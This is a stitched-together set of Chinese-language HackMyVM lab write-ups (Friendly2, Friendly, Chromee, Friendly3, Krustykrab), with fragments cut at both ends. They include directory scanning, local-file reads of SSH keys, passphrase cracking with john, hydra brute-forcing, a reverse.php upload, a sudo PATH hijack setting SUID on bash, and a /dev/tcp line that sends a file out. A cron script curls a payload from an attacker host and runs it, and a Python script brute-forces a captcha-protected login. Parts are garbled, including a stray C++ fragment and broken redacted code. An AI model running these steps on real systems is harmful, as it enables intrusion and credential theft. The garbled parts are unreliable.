    srand(time(0)); // 同步时间种子

    // 生成第一个随机数（对应原程序v21）
    int v21 = rand() % 86400;

    // 生成正态分布值（使用后续两个rand()调用）
    double normal_value = generate_normal_distribution();

    // 计算最终值
    int temp = static_cast<int>(5.0 * normal_value) + v21;
    temp = max(0, min(temp, 86399)); // 强制限制范围
    int key = temp + 12345;          // 最终密钥

    cout << key << endl;
    return 0;
}
```

cred  monitor.sh  ro0oo0ooo0oooo0oooo0ooo0oo0ot.txt

<root flag>
```

title: HMV-Family靶机渗透记录
HMV-Friendly2靶机渗透记录
content:
# 信息搜集
ip地址为`<INTERNAL_IP>`  开放22和80端口 ，80端口就是一个普通的页面，没啥功能点，扫一下目录
```shell
┌──(root㉿kali-plus)-[~] 
└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://<INTERNAL_IP>/ -x.txt,.php =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://<INTERNAL_IP>/ 
[+] Method: GET 
[+] Threads: 10 
[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt 
[+] Negative Status codes: 404 
[+] User Agent: gobuster/3.6 
[+] Extensions: txt,php 
[+] Timeout: 10s =============================================================== 
Starting gobuster in directory enumeration mode =============================================================== 
/.php (Status: 403) [Size: 278] 
/tools (Status: 301) [Size: 314] [--> http://<INTERNAL_IP>/tools/] 
/assets (Status: 301) [Size: 315] [--> http://<INTERNAL_IP>/assets/] 
/.php (Status: 403) [Size: 278] 
/server-status (Status: 403) [Size: 278] 
Progress: 904349 / 3821499 (23.66%) 
[!] Keyboard interrupt detected, terminating. Progress: 905503 / 3821499 (23.69%) 
=============================================================== 
Finished 
===============================================================
```
发现有一个tools，继续扫描tools目录下有啥，发现有一个docements目录，然后又三个html，貌似没什么用，然后assets目录下放的是一些图片，回头看了一下tools页面的源码，发现一个提示
```html
<!-- Redimensionar la imagen en check_if_exist.php?doc=keyboard.html -->
```
发现可以文件读取，可以读取/ect/passwd`<command>` 看看能不能读一下ssh密钥，根据刚刚得到的用户信息，读取gh0st用户的ssh连接私钥`<command>` 
```plain
<REDACTED_PRIVATE_KEY>
```
## 获取 User Flag
但是用私钥还是需要密码，用john爆破一下
```shell
┌──(root㉿kali-plus)-[~] 
└─# ssh2john tmp > hash.txt 
┌──(root㉿kali-plus)-[~] 
└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8 
Loaded 1 password hash SSH private key [RSA/DSA/EC/OPENSSH 32/64]) 
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes 
Cost 2 (iteration count) is 16 for all loaded hashes 
Will run 16 OpenMP threads 
Press 'q' or Ctrl-C to abort, almost any other key for status 
celtic   (tmp) 
1g 0:00:00:01 DONE (2025-04-24 15:45) 0.5524g/s 141.4p/s 141.4c/s 141.4C/s carolina..freedom 
Use the "--show" option to display all of the cracked passwords reliably Session completed.
```
得到口令已脱敏celtic` 尝试登录，但是一直没登录上去，看了一下发现是ssh密钥格式问题，格式对了然后输入口令已脱敏
```shell
gh0st@friendly2:~$ cat user.txt 
<user flag>
```

## 提权
```shell
gh0st@friendly2:~$ sudo -l 
Matching Defaults entries for gh0st on friendly2: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin User gh0st may run the following commands on friendly2: 
(ALL : ALL) SETENV: NOPASSWD: /opt/security.sh 
gh0st@friendly2:~$ cd /opt 
gh0st@friendly2:/opt$ ls 
0-day security.sh 
gh0st@friendly2:/opt$ file 0-day 0-day: directory 
gh0st@friendly2:/opt$ cd 0-day 
gh0st@friendly2:/opt/0-day$ ls 
names.txt 
gh0st@friendly2:/opt/0-day$ cat names.txt 
cat: names.txt: Permission denied  
gh0st@friendly2:/opt/0-day$ cd .. 
gh0st@friendly2:/opt$ ls 0-day security.sh 
```
```shell
gh0st@friendly2:/opt$ cat security.sh
#!/bin/bash 
echo "Enter the string to encode:" 
read string

# Validate that the string is no longer than 20 characters 
if [[ ${#string} -gt 20 ]]; then 
    echo "The string cannot be longer than 20 characters." 
    exit 1 
fi 

# Validate that the string does not contain special characters 
if echo "$string" | grep -q '[^[:alnum:] ]'; then 
    echo "The string cannot contain special characters." 
    exit 1 
fi 

sus1='A-Za-z' 
sus2='N-ZA-Mn-za-m' 

encoded_string=$(echo "$string" | tr $sus1 $sus2) 

echo "Original string: $string" 
echo "Encoded string: $encoded_string"
```
这个bash脚本是对输入的内容进行rot13加密，脚本中用到了grep，但是没使用绝对路径，改个环境变量就好了
```shell
gh0st@friendly2:/opt$ cd /tmp 
gh0st@friendly2:/tmp$ echo 'chmod +s /bin/bash' > grep 
gh0st@friendly2:/tmp$ chmod +x grep 
gh0st@friendly2:/tmp$ ls grep systemd-private-8f30f03d74e0499ea061bbd4a882ad65-apache2.service-Zu9Zkg systemd-private-8f30f03d74e0499ea061bbd4a882ad65-systemd-logind.service-fRSdmh gh0st@friendly2:/tmp$ where is grep bash: where: command not found gh0st@friendly2:/tmp$ whereis grep grep: /usr/bin/grep /usr/share/man/man1/grep.1.gz /usr/share/info/grep.info.gz gh0st@friendly2:/tmp$ sudo PATH=$PWD:$PATH /opt/security.sh 
Enter the string to encode: 123213
The string cannot contain special characters. 
gh0st@friendly2:/tmp$ ls -l /bin/bash 
-rwsr-sr-x 1 root root 1234376 Mar 27 2022 /bin/bash 
gh0st@friendly2:/tmp$ bash -p 
bash-5.1# cd /root 
bash-5.1# ls 
interfaces.sh root.txt 
bash-5.1# cat root.txt 
Not yet! Try to find root.txt. 

Hint: ... 
bash-5.1# find / -name "..." 2>/dev/null 
/... 
bash-5.1# cd /... 
bash-5.1# ls 
ebbg.txt 
bash-5.1# cat ebbg.txt 
It's codified, look the cipher: 
98199n723q0s44s6rs39r33685q8pnoq 
Hint: numbers are not codified
```
这里显示是没有被编码的，应该是需要用脚本加密一下，直接用赛博厨子加密一下就行，得到root flag为`98199a723d0f44f6ef39e33685d8cabd`

Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan's speed. Open :21 Open :80 [~] Starting Script(s) [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-22 10:02 CST Initiating ARP Ping Scan at 10:02 Scanning [1 port] Completed ARP Ping Scan at 10:02, 0.08s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 10:02 Completed Parallel DNS resolution of 1 host. at 10:02, 0.01s elapsed DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0] Initiating SYN Stealth Scan at 10:02 Scanning [2 ports] Discovered open port 80/tcp on Discovered open port 21/tcp on Completed SYN Stealth Scan at 10:02, 0.02s elapsed (2 total ports) Nmap scan report for Host is up, received arp-response (0.00081s latency). Scanned at 2025-04-22 10:02:05 CST for 0s PORT STATE SERVICE REASON 21/tcp open ftp syn-ack ttl 64 80/tcp open http syn-ack ttl 64 MAC Address: 00:0C:29:FE:88:BB (VMware) Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds Raw packets sent: 3 (116B) | Rcvd: 3 (116B) ``` 发现开放了80和21，发现80端口就是一个apache的服务，扫个目录看看，但是啥也没扫出来，ftp匿名登录进去只看到一个index.html ```html Apache2 Debian Default Page: It works
Apache2 Debian Default Page
It works!

This is the default welcome page used to test the correct operation of the Apache2 server after installation on Debian systems. If you can read this page, it means that the Apache HTTP server installed at this site is working properly. You should replace this file (located at /var/www/html/index.html) before continuing to operate your HTTP server.

If you are a normal user of this web site and don't know what this page is about, this probably means that the site is currently unavailable due to maintenance. If the problem persists, please contact the site's administrator.

Configuration Overview

Debian's Apache2 default configuration is different from the upstream default configuration, and split into several files optimized for interaction with Debian tools. The configuration system is fully documented in /usr/share/doc/apache2/README.Debian.gz. Refer to this for the full documentation. Documentation for the web server itself can be found by accessing the manual if the apache2-doc package was installed on this server.

The configuration layout for an Apache2 web server installation on Debian systems is as follows: 

/etc/apache2/
|-- apache2.conf
|       `--  ports.conf
|-- mods-enabled
|       |-- *.load
|       `-- *.conf
|-- conf-enabled
|       `-- *.conf
|-- sites-enabled
|       `-- *.conf
  • apache2.conf is the main configuration file. It puts the pieces together by including all remaining configuration files when starting up the web server.
  • ports.conf is always included from the main configuration file. It is used to determine the listening ports for incoming connections, and this file can be customized anytime.
  • Configuration files in the mods-enabled/, conf-enabled/ and sites-enabled/ directories contain particular configuration snippets which manage modules, global configuration fragments, or virtual host configurations, respectively.
  • They are activated by symlinking available configuration files from their respective *-available/ counterparts. These should be managed by using our helpers a2enmod, a2dismod, a2ensite, a2dissite, and a2enconf, a2disconf . See their respective man pages for detailed information.
  • The binary is called apache2. Due to the use of environment variables, in the default configuration, apache2 needs to be started/stopped with /etc/init.d/apache2 or apache2ctl. Calling /usr/bin/apache2 directly will not work with the default configuration.
Document Roots

By default, Debian does not allow access through the web browser to any file apart of those located in /var/www, public_html directories (when enabled) and /usr/share (for web applications). If your site is using a web document root located elsewhere (such as in /srv) you may need to whitelist your document root directory in /etc/apache2/apache2.conf.

The default Debian document root is /var/www/html. You can make your own virtual hosts under /var/www. This is different to previous releases which provides better security out of the box.

Reporting Problems

Please use the reportbug tool to report bugs in the Apache2 package with Debian. However, check existing bug reports before reporting a new bug.

Please report bugs specific to modules (such as PHP and others) to respective packages, not to the web server itself.

``` ## 获取 User Flag 但是可以上传文件，直接传一个reverse.php上去然后访问触发 ```shell ┌──(root㉿kali-plus)-[~] └─# ftp Connected to . 220 ProFTPD Server (friendly) [::ffff:] Name (:root): anonymous 331 Anonymous login ok, send your complete email address as your password 230 Anonymous access granted, restrictions apply Remote system type is UNIX. Using binary mode to transfer files. ftp> ls 229 Entering Extended Passive Mode (|||13041|) 150 Opening ASCII mode data connection for file list -rw-r--r-- 1 root root 10725 Feb 23 2023 index.html 226 Transfer complete ftp> ls -al 229 Entering Extended Passive Mode (|||55672|) 150 Opening ASCII mode data connection for file list drwxrwxrwx 2 root root 4096 Mar 11 2023 . drwxrwxrwx 2 root root 4096 Mar 11 2023 .. -rw-r--r-- 1 root root 10725 Feb 23 2023 index.html 226 Transfer complete ftp> put reverse.php local: reverse.php remote: reverse.php 229 Entering Extended Passive Mode (|||27054|) 150 Opening BINARY mode data connection for reverse.php 100% |******************************************| 5493 13.74 MiB/s 00:00 ETA 226 Transfer complete 5493 bytes sent in 00:00 (2.56 MiB/s) ftp> ls -al 229 Entering Extended Passive Mode (|||55029|) 150 Opening ASCII mode data connection for file list drwxrwxrwx 2 root root 4096 Apr 22 02:13 . drwxrwxrwx 2 root root 4096 Apr 22 02:13 .. -rw-r--r-- 1 root root 10725 Feb 23 2023 index.html -rw-r--r-- 1 ftp nogroup 5493 Apr 22 02:13 reverse.php 226 Transfer complete ``` ## 提权 拿到shell之后找提权的点 ```shell www-data@friendly:/$ sudo -l sudo -l atching Defaults entries for www-data on friendly: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin User www-data may run the following commands on friendly: (ALL : ALL) NOPASSWD: /usr/bin/vim ``` 直接vim提权一手 使用命令 `` 即可拿到root权限，然后直接去读user和root的flag ```shell cat user.txt # cat root.txt cat root.txt Not yet! Find root.txt. ``` 说明这个不是真正的root flag，直接find去找 ```shell # find / -name root.txt 2>/dev/null /var/log/apache2/root.txt /root/root.txt # cat /var/log/apache2/root.txt ```

title: HMV-Chromee靶机渗透记录
content:
# 信息搜集 ip地址为``，接着对端口进行信息搜集 ```plain ┌──(root㉿kali-plus)-[~] └─# arp-scan -l Interface: eth0, type: EN10MB, MAC: 00:0c:29:1d:89:b5, IPv4: Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 0a:00:27:00:00:17 (Unknown: locally administered) 08:00:27:99:57:5b PCS Systemtechnik GmbH 08:00:27:a5:6f:25 PCS Systemtechnik GmbH 3 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 2.043 seconds (125.31 hosts/sec). 3 responded ┌──(root㉿kali-plus)-[~] └─# nmap -p- Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-28 19:46 CST mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers Nmap scan report for Host is up (0.0034s latency). Not shown: 65531 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8080/tcp open http-proxy 23333/tcp open elxmgmt MAC Address: 08:00:27:A5:6F:25 (Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 13.84 seconds ┌──(root㉿kali-plus)-[~] └─# nmap -sV -sT -p 8080,23333 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-28 19:47 CST mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers Nmap scan report for Host is up (0.0011s latency). PORT STATE SERVICE VERSION 8080/tcp open http Apache httpd 2.4.56 ((Debian)) 23333/tcp open ftp vsftpd 3.0.3 MAC Address: 08:00:27:A5:6F:25 (Oracle VirtualBox virtual NIC) Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.54 seconds ``` 发现22，80，8080和23333端口是开放的，先看看80和8080端口的情况 ```bash ┌──(root㉿kali-plus)-[~] └─# curl http://:80 primary
ModernUI
立即体验

创造非凡体验

用创新设计打造卓越数字产品

了解更多

响应式设计

完美适配各种设备屏幕尺寸，提供一致的用户体验

现代交互

流畅的动画与直观的操作，提升用户参与度

高效性能

优化代码结构，确保快速加载与流畅运行

┌──(root㉿kali-plus)-[~] └─# curl http://:8080

You may need to bypass!

``` 接着使用 `gobuster` 进行目录扫描，发现了 `/post.php` 和 `/secret.php` 两个接口，其中 `/secret.php` 会返回一段 PHP 逻辑。 ```bash ┌──(root㉿kali-plus)-[~] └─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http:/// -x.txt,.php,.zip =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) =============================================================== [+] Url: http:/// [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,php,zip [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /post.php (Status: 200) [Size: 3] /secret.php (Status: 200) [Size: 549] Progress: 558124 / 882240 (63.26%)^C [!] Keyboard interrupt detected, terminating. Progress: 558313 / 882240 (63.28%) =============================================================== Finished =============================================================== ┌──(root㉿kali-plus)-[~] └─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://:8080/ -x.txt,.php,.zip =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://:8080/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: php,zip,txt [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /javascript (Status: 301) [Size: 328] [--> http://:8080/javascript/] /silence (Status: 403) [Size: 281] /server-status (Status: 403) [Size: 281] Progress: 882236 / 882240 (100.00%) =============================================================== Finished =============================================================== ``` ```php Secret {$greeting}，adriana"; echo "

当前时间：" . date('Y-m-d H:i:s') . "

"; echo "

你的IP：{$visitorIP}

"; if (isset($_GET['aaa'])) { $file_content = file_get_contents('/opt/note/dic.txt'); echo $file_content; } else { die(); } ?> ``` ## 获取 User Flag 访问/server的时候显示403，换了一种请求方式发现变成301，在后面加个/index.html发现访问成功，并且得到一个邮箱地址，有用的应该是这个chromee.hmv，写到hosts文件里，再去访问http://chromee.hmv/secret.php ```bash Silence We are working to improve our website. contact: support@chromee.hmv ``` 此时发现secret.php被解析了，尝试传入参数，貌似不管输入什么参数，都是回显 ```plain 下午好，adriana 当前时间：2025-03-28 13:57:34 你的IP： The Lost Key Lily, a curious girl, found an old rusty key in the woods. Wondering where it belonged, she asked everyone in the village, but no one knew. One day, she discovered a locked stone well. To her surprise, the key fit. She opened it and descended into a hidden passage. There, she found an ancient chest filled with treasures. But the real treasure was a note inside: “The greatest treasure is the journey, not the prize.” Lily smiled, realizing the adventure was the real reward. ``` 这里出现2个人名，adriana和Lily，使用cupp生成2个字典，把他放到一个文件中，然后对23333端口进行爆破 ```plain ┌──(root㉿kali-plus)-[~] └─# hydra -l adriana -P chromee.txt ftp://:23333 -t 10 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-28 21:26:33 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 10 tasks per 1 server, overall 10 tasks, 163 login tries (l:1/p:163), ~17 tries per task [DATA] attacking ftp://:23333/ [23333][ftp] host: login: adriana password: 1 of 1 target successfully completed, 1 valid password (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-28 21:26:46 ``` 这里我先猜测 `adriana` 可能是用户名，爆破出对应口令后登录 FTP，接着在目录里找到了两个本地用户以及一份 `zeus.conf`。 ```plain ftp> cd home 250 Directory successfully changed. ftp> ls 229 Entering Extended Passive Mode (|||49606|) 150 Here comes the directory listing. drwxr-x--- 4 1000 1000 4096 Mar 09 07:59 follower drwxr-x--- 3 1001 1001 4096 Mar 07 12:39 softly 226 Directory send OK. lftp adriana@:/srv> cat zeus.conf permit follower as softly cmd /usr/local/bin/wfuzz permit nopass :softly as root cmd /usr/bin/chromium permit nopass :softly as root cmd /usr/bin/kill ``` ftp好难用，不支持cat命令，使用lftp连上去，有一个`...`的文件 ```plain ┌──(root㉿kali-plus)-[~] └─# lftp -u adriana -p 23333 lftp 登录口令已脱敏。 lftp adriana@:~> ls -rw-r--r-- 1 0 0 495 Mar 07 14:40 dic.txt lftp adriana@:~> ls -al drwxr-xr-x 2 106 115 4096 Mar 09 08:13 . drwxr-xr-x 4 0 0 4096 Mar 09 08:12 .. -rw-r--r-- 1 0 0 3414 Mar 09 08:13 ... -rw-r--r-- 1 0 0 495 Mar 07 14:40 dic.txt lftp adriana@:~> cat ... 3414 bytes transferred ``` 发现是密钥，拿到本地给他爆破一下 ```plain ┌──(root㉿kali-plus)-[~] └─# john tmp --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes Cost 2 (iteration count) is 24 for all loaded hashes Will run 16 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status cassandra (id3) 1g 0:00:00:10 DONE (2025-03-28 22:01) 0.09680g/s 99.12p/s 99.12c/s 99.12C/s hawaii..bethany Use the "--show" option to display all of the cracked passwords reliably Session completed. ┌──(root㉿kali-plus)-[~] └─# john tmp --show id3:cassandra 1 password cracked, 0 left ``` 私钥口令已经脱敏。由于当前只拿到了两个候选用户，逐个尝试后发现 `follower` 可以成功登录。 ```plain ┌──(root㉿kali-plus)-[~] └─# ssh follower@ -i id3 Enter passphrase for key 'id3': follower@Chromee:~$ ls cat.gif note.txt follower@Chromee:~$ cat note.txt Think about rotations and the cat’s secrets. 47 is not just a number, it's a twist of fate. ``` 这里也得到一个提示，还有一个gif图片，使用nc的方式把这个图片弹到kali中 ```plain cat cat.gif >/dev/tcp//1234 nc -lp 1234 > cat.gif ``` 既然是gif，那试试帧分离，发现不是gif帧分离，看一下exif信息 ```plain ┌──(root㉿kali-plus)-[~/hmv/chromee] └─# exiftool cat.gif ExifTool Version Number : 12.76 File Name : cat.gif Directory : . File Size : 3.5 MB File Modification Date/Time : 2025:03:28 22:23:24+08:00 File Access Date/Time : 2025:03:28 22:24:09+08:00 File Inode Change Date/Time : 2025:03:28 22:23:24+08:00 File Permissions : -rw-r--r-- File Type : GIF File Type Extension : gif MIME Type : image/gif GIF Version : 89a Image Width : 640 Image Height : 640 Has Color Map : Yes Color Resolution Depth : 8 Bits Per Pixel : 8 Background Color : 0 Animation Iterations : Infinite Comment : Imagemagick Convert Timeline Profile CMM Type : Profile Version : 4.3.0 Profile Class : Display Device Profile Color Space Data : RGB Profile Connection Space : XYZ Profile Date Time : 2016:01:01 00:00:00 Profile File Signature : acsp Primary Platform : Unknown () CMM Flags : Not Embedded, Independent Device Manufacturer : Device Model : Device Attributes : Reflective, Glossy, Positive, Color Rendering Intent : Media-Relative Colorimetric Connection Space Illuminant : 0.9642 1 0.82491 Profile Creator : Profile ID : 0 Profile Description : sRGB Red Matrix Column : 0.43607 0.22249 0.01392 Green Matrix Column : 0.38515 0.71687 0.09708 Blue Matrix Column : 0.14307 0.06061 0.7141 Media White Point : 0.9642 1 0.82491 Red Tone Reproduction Curve : (Binary data 40 bytes, use -b option to extract) Green Tone Reproduction Curve : (Binary data 40 bytes, use -b option to extract) Blue Tone Reproduction Curve : (Binary data 40 bytes, use -b option to extract) Profile Copyright : Google Inc. 2016 Frame Count : 13 Duration : 6.31 s Image Size : 640x640 Megapixels : 0.410 ``` `Comment: Imagemagick Convert Timeline`发现这个，直接去搜一下看看有没有相关文章，找到一篇 [https://www.cnblogs.com/chtxrt/p/17280677.html](https://www.cnblogs.com/chtxrt/p/17280677.html) 先使用identify对图片进行分析 ```plain ┌──(root㉿kali-plus)-[~/hmv/chromee] └─# identify cat.gif cat.gif[0] GIF 640x640 640x640+0+0 8-bit sRGB 256c 0.010u 0:00.003 cat.gif[1] GIF 640x640 640x640+0+0 8-bit sRGB 256c 0.010u 0:00.004 cat.gif[2] GIF 640x640 640x640+0+0 8-bit sRGB 256c 0.010u 0:00.003 cat.gif[3] GIF 640x640 640x640+0+0 8-bit sRGB 256c 0.010u 0:00.003 cat.gif[4] GIF 640x640 640x640+0+0 8-bit sRGB 256c 0.010u 0:00.003 cat.gif[5] GIF 640x640 640x640+0+0 8-bit sRGB 256c 0.010u 0:00.003 cat.gif[6] GIF 640x640 640x640+0+0 8-bit sRGB 256c 0.010u 0:00.003 cat.gif[7] GIF 640x640 640x640+0+0 8-bit sRGB 256c 0.010u 0:00.003 cat.gif[8] GIF 640x640 640x640+0+0 8-bit sRGB 256c 0.010u 0:00.002 cat.gif[9] GIF 640x640 640x640+0+0 8-bit sRGB 256c 0.000u 0:00.002 cat.gif[10] GIF 640x640 640x640+0+0 8-bit sRGB 256c 0.000u 0:00.002 cat.gif[11] GIF 640x640 640x640+0+0 8-bit sRGB 256c 0.000u 0:00.002 cat.gif[12] GIF 640x640 640x640+0+0 8-bit sRGB 256c 3.33064MiB 0.000u 0:00.002 ┌──(root㉿kali-plus)-[~/hmv/chromee] └─# identify -format "%s %T \n" cat.gif 0 65 1 98 2 65 3 100 4 102 5 98 6 67 7 6 8 6 9 6 10 6 11 6 12 6 ┌──(root㉿kali-plus)-[~/hmv/chromee] └─# identify -format "%T " cat.gif 65 98 65 100 102 98 67 6 6 6 6 6 6 ``` 这里主要看每一帧的时间间隔，很容易联想到 ASCII。把数值转成字符后，再结合 `note.txt` 里提到的 `47`，基本可以判断还需要做一次 `rot47`。得到 `follower` 的口令后，就可以结合前面 `zeus.conf` 中 `permit follower as softly cmd /usr/local/bin/wfuzz` 这条规则继续提权。 ```plain follower@Chromee:~$ cat /usr/local/bin/wfuzz 目录下的文件。直接读脚本本体没有结果，于是先列目录，再去查看其中的 `script.js`。 ```plain softly@Chromee:~$ doas -u root /usr/bin/chromium -headless --no-sandbox --disable-gpu --dump-dom file:///root/scripts.sh [0328/164332.647180:WARNING:bluez_dbus_manager.cc(248)] Floss manager not present, cannot set Floss enable/disable. softly@Chromee:~$ doas -u root /usr/bin/chromium -headless --no-sandbox --disable-gpu --dump-dom file:///root/ [0328/164339.741300:WARNING:bluez_dbus_manager.cc(248)] Floss manager not present, cannot set Floss enable/disable. softly@Chromee:~$ doas -u root /usr/bin/chromium -headless --no-sandbox --disable-gpu --dump-dom file:///root/script.js [0328/164348.249361:WARNING:bluez_dbus_manager.cc(248)] Floss manager not present, cannot set Floss enable/disable. 
const CDP = require('chrome-remote-interface');

async function sendPostRequest() {
    const client = await CDP();

    const { Network, Page, Runtime } = client;

    try {
        // 启用网络调试
        await Network.enable();

        // 启用页面调试
        await Page.enable();

        // 访问页面
        await Page.navigate({ url: 'http://:80' });
        await Page.loadEventFired();  // 等待页面加载完成

        console.log('Page loaded. Sending POST request...');

        // 在浏览器环境中执行 fetch 发送 POST 请求
        const postData = JSON.stringify({ key: 'UGhhbnRvbSBFbmdhZ2UK' });

        const script = `
            fetch('http:///post.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: '${postData}'
            }).then(res => res.text()).then(console.log).catch(console.error);
        `;

        // 通过 Runtime.evaluate 在浏览器里执行 JavaScript 代码
        await Runtime.evaluate({ expression: script });

    } catch (err) {
        console.error('Error:', err);
    } finally {
        client.close();
    }
}

sendPostRequest();
``` 这里拿到了一段经过编码的 root 凭据，原始内容已经脱敏处理。 ```plain softly@Chromee:~$ su - root Password uid=0(root) gid=0(root) grupos=0(root) root@Chromee:~# ls -al total 76 drwx------ 9 root root 4096 mar 7 17:09 . drwxr-xr-x 18 root root 4096 mar 7 10:41 .. lrwxrwxrwx 1 root root 9 abr 23 2023 .bash_history -> /dev/null -rw------- 1 root root 3526 ene 15 2023 .bashrc drwxr-xr-x 4 root root 4096 mar 7 14:00 .cache drwxr-xr-x 4 root root 4096 mar 7 13:57 .config drwx------ 3 root root 4096 mar 7 11:14 .gnupg -rw------- 1 root root 33 mar 7 02:27 .lesshst drw------- 3 root root 4096 ene 15 2023 .local drwxr-xr-x 6 root root 4096 mar 7 16:33 node_modules drwxr-xr-x 4 root root 4096 mar 7 14:20 .npm -rw-r--r-- 1 root root 69 mar 7 16:33 package.json -rw-r--r-- 1 root root 2383 mar 7 16:33 package-lock.json -rw------- 1 root root 161 jul 9 2019 .profile -rw------- 1 root root 12 mar 7 10:57 .python_history -r-------- 1 root root 39 mar 7 13:01 root.txt -rw-r--r-- 1 root root 1208 mar 7 17:06 script.js -rwxr-xr-x 1 root root 38 mar 7 17:09 script.sh -rw-r--r-- 1 root root 66 mar 7 02:40 .selected_editor drw-r--r-- 2 root root 4096 mar 7 02:31 .ssh root@Chromee:~# cat root.txt ```

title: HMV-Friendly3靶机渗透记录
content:
# 信息搜集
ip地址为`<INTERNAL_IP>` 开放了21，22，80端口，80端口的web页面有一句话
```plain
Hi, sysadmin  
I want you to know that I've just uploaded the new files into the FTP Server.  
See you,  
juan.
```
意思是告诉我们ftp，也就是21端口有东西，看看能不能匿名登录进去看看，发现匿名登录进不去，看看能不能爆破一下ftp的密码，根据刚刚得到的提示，用户名是sysadmin或者juan
```shell
[21][ftp] host: <INTERNAL_IP> login: juan password: <REDACTED_PASSWORD>
```
得到口令已脱敏 登录进去看看 发现好多文件，但是貌似没什么用，先放一边，看看能不能爆破ssh的
密码
## 获取 User Flag
```shell
[22][ssh] host: <INTERNAL_IP> login: juan password: <REDACTED_PASSWORD>
```
发现是一样的密码

The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. 
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law.

ftp user.txt 
juan@friendly3:~$ cat user.txt 
<user flag>
```
## 提权

```
发现一个定时任务
```bash
#!/bin/bash 

/usr/bin/curl "http://<ATTACKER_IP>/9842734723948024.bash" > /tmp/a.bash 

chmod +x /tmp/a.bash 
chmod +r /tmp/a.bash 
chmod +w /tmp/a.bash 

/bin/bash /tmp/a.bash 

rm -rf /tmp/a.bash
```
这个脚本先是把9842734723948024.bash的内容重定向到/tmp/a.bash，接着一步一步的给权限，不是一次性给完，这就导致有一部分时间是可以写入的，可以尝试劫持

title: HMV-Krustykrab靶机渗透记录
content:
# 信息搜集
ip地址为`<INTERNAL_IP>` 开放80和22，80端口是一个apache，查看源码发现一个`<command>`路由 访问之后右上角有登录界面，在/team.html页面有一些人名，猜测是用户名，这里有个坑就是验证码要小写，这里我用大佬的python脚本去爆破密码

import requests

WORDLIST_FILE = r"/usr/share/wordlists/rockyou.txt"
BASE_URL = 'http://<INTERNAL_IP>/finexo/'
LOGIN_URL = BASE_URL + 'login.php'
CAPTCHA_URL = BASE_URL + 'login.php?action=generateCaptcha'

def read_wordlist(path):
    # 确保 with 语句及其后续代码块正确缩进
    with open(path, 'r', encoding='utf-8') as wordlist:
        for word in wordlist:
            yield word.strip()

session = requests.Session()
for password <REDACTED_PASSWORD> read_wordlist(WORDLIST_FILE):
    captcha = session.get(CAPTCHA_URL).text
    data = {
        'username': 'SpongeBob',
        'password <REDACTED_PASSWORD>
        'captcha': captcha
    }
    response = session.post(LOGIN_URL, data=data)
    if 'Wrong' in response.text:
        print(f'[!] Wrong password <REDACTED_PASSWORD>
    elif 'Captcha' in response.text:
        print(f'[!] Wrong captcha {password
    <REDACTED_PASSWORD>
        print(f'[+] Found password <REDACTED_PASSWORD>
        break
```
等待一会就能得到口令已脱敏squarepants` 
```plain
